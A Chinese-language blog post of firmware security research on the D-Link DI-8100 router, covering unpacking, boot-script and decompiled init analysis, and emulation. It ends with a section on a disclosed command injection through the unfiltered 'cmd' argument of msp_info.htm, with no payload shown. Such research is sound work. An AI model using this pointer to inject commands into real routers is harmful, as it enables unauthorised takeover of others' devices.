

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="GroundCtl2MajorTom">
  <meta name="keywords" content="">
  
    <meta name="description" content="DI-8100固件分析固件名：DI_8100-16.07.26A1.trx  型号：DI_8100 版本：16.07.26A1 官网：https:&#x2F;&#x2F;www.DLINK.com&#x2F; 测试环境：Ubuntu 22.04  信息搜集binwalk -Me 解包  123cpio 是一个命令行工具，用于创建和提取归档文件，它可以将文件或目录树打包成一个单一的归档文件。这种归档文件可以包含多个文件和目录的完">
<meta property="og:type" content="article">
<meta property="og:title" content="DI-8100固件分析">
<meta property="og:url" content="http://groundctl2majortom.github.io/2024/06/04/DI-8100%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="GroundCtl2MajorTom">
<meta property="og:description" content="DI-8100固件分析固件名：DI_8100-16.07.26A1.trx  型号：DI_8100 版本：16.07.26A1 官网：https:&#x2F;&#x2F;www.DLINK.com&#x2F; 测试环境：Ubuntu 22.04  信息搜集binwalk -Me 解包  123cpio 是一个命令行工具，用于创建和提取归档文件，它可以将文件或目录树打包成一个单一的归档文件。这种归档文件可以包含多个文件和目录的完">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805191441478.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805150610582.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805151010982.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805155942930.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805160130918.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805172306721.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805191305424.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805162232194.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805162324012.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805163634264.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805173200857.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183037865.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183321904.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183910293.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805184751826.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805185748700.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190106386.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190544005.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190645152.png">
<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190737110.png">
<meta property="article:published_time" content="2024-06-04T06:43:45.000Z">
<meta property="article:modified_time" content="2024-09-04T06:44:25.600Z">
<meta property="article:author" content="GroundCtl2MajorTom">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805191441478.png">
  
  
  
  <title>DI-8100固件分析 - GroundCtl2MajorTom</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>GroundCtl2majorTom</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="DI-8100固件分析"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-04 14:43" pubdate>
          2024年6月4日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          1.5k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          13 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">DI-8100固件分析</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="DI-8100固件分析"><a href="#DI-8100固件分析" class="headerlink" title="DI-8100固件分析"></a>DI-8100固件分析</h2><p>固件名：DI_8100-16.07.26A1.trx</p>
<ul>
<li>型号：DI_8100</li>
<li>版本：16.07.26A1</li>
<li>官网：<a target="_blank" rel="noopener" href="https://www.dlink.com/">https://www.DLINK.com/</a></li>
<li>测试环境：Ubuntu 22.04</li>
</ul>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>binwalk -Me 解包</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805191441478.png" srcset="/img/loading.gif" lazyload alt="image-20240805191441478"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cpio</span> 是一个命令行工具，用于创建和提取归档文件，它可以将文件或目录树打包成一个单一的归档文件。这种归档文件可以包含多个文件和目录的完整层次结构，类似于 tar 命令创建的归档文件。与 tar 不同的是，cpio 使用更简单的文件打包格式，并且在一些操作方面更加灵活。<br><br>一般来说，cpio 命令可以用来创建和解压不同类型的归档文件，如 cpio-root 可能指的是一个包含根文件系统的 cpio 归档文件，用于嵌入式系统的初始化或备份恢复。这种用法通常用于嵌入式系统开发或者Linux系统初始化时的一种方法。<br></code></pre></td></tr></table></figure>

<p>firmwalker</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean">##################################### busybox<br>/bin/busybox<br><br>-------------------- telnet --------------------<br>/usr/sbin/jhttpd  <span class="hljs-comment">//服务</span><br>/usr/sbin/wys  <span class="hljs-comment">//封装很多命令的二进制文件</span><br>/etc_ro/rcS  <span class="hljs-comment">//启动项</span><br>##################################### telnetd<br>/usr/sbin/telnetd   <span class="hljs-comment">//telnet服务端</span><br>-------------------- dropbear --------------------<br>/usr/sbin/jhttpd  <span class="hljs-comment">//服务</span><br></code></pre></td></tr></table></figure>

<p>firmwalker并未枚举到任何web目录或文件。</p>
<h4 id="启动项分析"><a href="#启动项分析" class="headerlink" title="启动项分析"></a>启动项分析</h4><p>linux系统的启动顺序</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span>.启动 <span class="hljs-keyword">init</span>：内核启动后，运行 <span class="hljs-operator">/</span><span class="hljs-keyword">init</span><span class="hljs-operator">。</span><br><span class="hljs-number">2</span>.读取 inittab：<span class="hljs-keyword">init</span> 读取 <span class="hljs-regexp">/etc/</span>inittab 文件，确定默认运行级别和要执行的初始进程<span class="hljs-operator">。</span><br><span class="hljs-number">3</span>.执行系统初始化：根据 inittab 中的配置，执行系统初始化脚本和命令<span class="hljs-operator">。</span><br><span class="hljs-number">4</span>.进入运行级别：切换到指定的运行级别，并启动该级别下的所有服务和进程<span class="hljs-operator">。</span><br></code></pre></td></tr></table></figure>

<p>这里init二进制文件是一个软链接指向了rc</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805150610582.png" srcset="/img/loading.gif" lazyload alt="image-20240805150610582"></p>
<p>打开rc二进制文件</p>
<p>main函数在汇编中可以看到跳入了init_main函数</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805151010982.png" srcset="/img/loading.gif" lazyload alt="image-20240805151010982"></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs perl">void init_main(void)<br><br>&#123;<br>.......<br>  mount(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;/proc&quot;</span>,<span class="hljs-string">&quot;proc&quot;</span>,<span class="hljs-number">0</span>,(void *)<span class="hljs-number">0x0</span>); <span class="hljs-regexp">//</span> 挂载 proc 文件系统<br>  mount(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;/tmp&quot;</span>,<span class="hljs-string">&quot;ramfs&quot;</span>,<span class="hljs-number">0</span>,(void *)<span class="hljs-number">0x0</span>); <span class="hljs-regexp">//</span> 挂载 ramfs 文件系统<br>  mount(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;/sys&quot;</span>,<span class="hljs-string">&quot;sysfs&quot;</span>,<span class="hljs-number">0</span>,(void *)<span class="hljs-number">0x0</span>); <span class="hljs-regexp">//</span> 挂载 sysfs 文件系统<br>.......<br>  <span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;/var/lock&quot;</span>,<span class="hljs-number">0x1ff</span>); <span class="hljs-regexp">//</span> 创建目录<br>  <span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;/var/tmp/dhcp&quot;</span>,<span class="hljs-number">0x1ff</span>); <span class="hljs-regexp">//</span> 创建目录<br>  <span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;/home/root&quot;</span>,<span class="hljs-number">0x1c0</span>); <span class="hljs-regexp">//</span> 创建目录<br>  <span class="hljs-keyword">chmod</span>(<span class="hljs-string">&quot;/tmp&quot;</span>,<span class="hljs-number">0x1ff</span>); <span class="hljs-regexp">//</span> 修改权限<br>  f_write(<span class="hljs-string">&quot;/etc/hosts&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x1a4</span>); <span class="hljs-regexp">//</span> 写入文件<br>  simple_unlock(&amp;DAT_0041a864); <span class="hljs-regexp">//</span> 解锁<br>  simple_unlock(<span class="hljs-string">&quot;firewall&quot;</span>); <span class="hljs-regexp">//</span> 解锁<br>  simple_unlock(<span class="hljs-string">&quot;restrictions&quot;</span>); <span class="hljs-regexp">//</span> 解锁<br>  simple_unlock(<span class="hljs-string">&quot;nvram_commit&quot;</span>); <span class="hljs-regexp">//</span> 解锁<br>  <span class="hljs-keyword">umask</span>(<span class="hljs-number">0x12</span>); <span class="hljs-regexp">//</span> 设置文件模式创建掩码<br>  __dirp = <span class="hljs-keyword">opendir</span>(<span class="hljs-string">&quot;/rom/etc&quot;</span>); <span class="hljs-regexp">//</span> 打开目录<br>  <span class="hljs-keyword">if</span> (__dirp != (DIR *)<span class="hljs-number">0x0</span>) &#123; <span class="hljs-regexp">//</span> 检查是否成功打开目录<br>    <span class="hljs-keyword">while</span> (pdVar2 = <span class="hljs-keyword">readdir</span>(__dirp), pdVar2 != (dirent *)<span class="hljs-number">0x0</span>) &#123; <span class="hljs-regexp">//</span> 读取目录项<br>      <span class="hljs-keyword">while</span> (pdVar2-&gt;d_name[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;.&#x27;</span>) &#123; <span class="hljs-regexp">//</span> 检查名称是否以 <span class="hljs-string">&#x27;.&#x27;</span> 开头<br>        snprintf(acStack_260,<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>&quot;</span>,&amp;DAT_0041a86c,pdVar2-&gt;d_name); <span class="hljs-regexp">//</span> 构建路径<br>        snprintf(acStack_160,<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>&quot;</span>,&amp;DAT_0041a870,pdVar2-&gt;d_name); <span class="hljs-regexp">//</span> 构建路径<br>        <span class="hljs-keyword">symlink</span>(acStack_260,acStack_160); <span class="hljs-regexp">//</span> 创建符号链接<br>        pdVar2 = <span class="hljs-keyword">readdir</span>(__dirp); <span class="hljs-regexp">//</span> 读取下一个目录项<br>        <span class="hljs-keyword">if</span> (pdVar2 == (dirent *)<span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> LAB_00405234; <span class="hljs-regexp">//</span> 如果为空则跳转<br>      &#125;<br>    &#125;<br>.......<br>LAB_004063c4:                      <br>    start_jhttpd();                <span class="hljs-regexp">//</span> 启动 HTTP 服务器<br>    jhttpd_run = <span class="hljs-number">1</span>;                <span class="hljs-regexp">//</span> 设置 jhttpd_run 标志为 <span class="hljs-number">1</span>，表示 HTTP 服务器正在运行<br>    start_services();              <span class="hljs-regexp">//</span> 启动其他服务<br>    jhl_start_wan_all(<span class="hljs-number">0</span>);          <span class="hljs-regexp">//</span> 启动所有 WAN 接口，参数 <span class="hljs-number">0</span> 可能是配置选项<br>    <span class="hljs-keyword">if</span> (jhl_yy_run == <span class="hljs-number">0</span>)           // 检查 jhl_yy_run 标志是否为 <span class="hljs-number">0</span><br>        <span class="hljs-keyword">goto</span> LAB_00406408;         <span class="hljs-regexp">//</span> 如果 jhl_yy_run 为 <span class="hljs-number">0</span>，跳转到标签 LAB_00406408<br>LAB_00406094:                      <span class="hljs-regexp">//</span> 标签 LAB_00406094，指示代码块的开始<br>    start_dhcp_server();           <span class="hljs-regexp">//</span> 启动 DHCP 服务器<br>    start_openvpn();               <span class="hljs-regexp">//</span> 启动 OpenVPN 服务<br>    pppoe_srv_start(&amp;DAT_0041afe8);<span class="hljs-regexp">//</span> 启动 PPPoE 服务器，并传递地址 &amp;DAT_0041afe8 作为参数<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;                           <span class="hljs-regexp">//</span> <span class="hljs-keyword">else</span> 分支，处理 jhl_yy_run 不为 <span class="hljs-number">0</span> 的情况<br>    jhl_start_vlan(<span class="hljs-number">0</span>);             <span class="hljs-regexp">//</span> 启动 VLAN 配置，参数 <span class="hljs-number">0</span> 可能是配置选项<br>    start_vlan();                  <span class="hljs-regexp">//</span> 启动 VLAN 服务<br>    start_lan();                   <span class="hljs-regexp">//</span> 启动 LAN 服务<br>    <span class="hljs-keyword">if</span> (jhttpd_run == <span class="hljs-number">0</span>)           // 检查 jhttpd_run 标志是否为 <span class="hljs-number">0</span><br>        <span class="hljs-keyword">goto</span> LAB_004063c4;         <span class="hljs-regexp">//</span> 如果 jhttpd_run 为 <span class="hljs-number">0</span>，跳转到标签 LAB_004063c4<br>.......<br>&#125;<br></code></pre></td></tr></table></figure>

<p>进入start_jhttpd()</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">start_jhttpd</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br><br>&#123;<br>  <span class="hljs-title function_">_xstart</span>(<span class="hljs-string">&quot;jhttpd&quot;</span>,<span class="hljs-number">0</span>);<br>  pid_jhttpd = <span class="hljs-number">0xfffffffe</span>;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>进入_xstart(“jhttpd”,0);</p>
<p>定位到了libshared.so库中</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805155942930.png" srcset="/img/loading.gif" lazyload alt="image-20240805155942930"></p>
<p>进入_eval_nowait函数</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805160130918.png" srcset="/img/loading.gif" lazyload alt="image-20240805160130918"></p>
<p>jhttpd，0 参数应该在这里被执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">execvp 函数被用来在当前进程的上下文中执行一个新的程序。<br>它会取代当前进程的内存映像（代码、数据和堆栈），加载并执行指定的程序。<br>execvp 是属于 <span class="hljs-built_in">exec</span> 函数族的一员，这个函数族包括了多个变种，如 execve, execl, execle 等，区别在于参数传递方式和路径搜索方式。<br></code></pre></td></tr></table></figure>

<p>rcS文件</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#!/bin/sh<br>mount -<span class="hljs-selector-tag">a</span>   <span class="hljs-comment">//挂载</span><br>mkdir -<span class="hljs-selector-tag">p</span> /var/run  <br>cat /etc_ro/motd<br>nvram_daemon&amp;   <span class="hljs-comment">//启动nvram守护进程</span><br>goahead&amp;        <span class="hljs-comment">//启动goahead，但是这固件并不存在goahead，程序员的锅</span><br><br><span class="hljs-selector-id">#for</span> telnet debugging<br>telnetd   <span class="hljs-comment">//启动telnet</span><br><br><span class="hljs-selector-id">#for</span> syslogd<br>mkdir -<span class="hljs-selector-tag">p</span> /var/log<br><span class="hljs-selector-id">#samba</span><span class="hljs-selector-class">.sh</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.254</span>/<span class="hljs-number">24</span> ralink rt3052<br><br><span class="hljs-selector-id">#the</span> following config <span class="hljs-keyword">for</span> RT3052 FPGA only<br><span class="hljs-selector-id">#reg</span> s b0110000<br><span class="hljs-selector-id">#reg</span> w c8 <span class="hljs-number">20</span>f02b28<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">0</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">4</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">0</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">4</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#reg</span> w c8 <span class="hljs-number">3</span>ff02b28<br></code></pre></td></tr></table></figure>

<p>这个固件比较奇葩的是没有web文件，所有的web文件全部封装在二进制jhttpd中</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805172306721.png" srcset="/img/loading.gif" lazyload alt="image-20240805172306721"></p>
<h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>firmAE模拟成功</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805191305424.png" srcset="/img/loading.gif" lazyload alt="image-20240805191305424"></p>
<h3 id="命令注入1day分析"><a href="#命令注入1day分析" class="headerlink" title="命令注入1day分析"></a>命令注入1day分析</h3><p>Description<br>A vulnerability, which was classified as critical, has been found in D-Link DI-8100 16.07. This issue affects the function msp_info_htm of the file msp_info.htm. The manipulation of the argument cmd leads to command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-273521 was assigned to this vulnerability.</p>
<p>已知msp_info存在命令注入</p>
<p>ida打开jhttpd，搜索字符串msp_info定位到msp_info_htm</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805162232194.png" srcset="/img/loading.gif" lazyload alt="image-20240805162232194"></p>
<p>参数传递如图所示</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805162324012.png" srcset="/img/loading.gif" lazyload alt="image-20240805162324012"></p>
<p>这里对传入的参数没有任何过滤，所以造成命令执行</p>
<p>试一下</p>
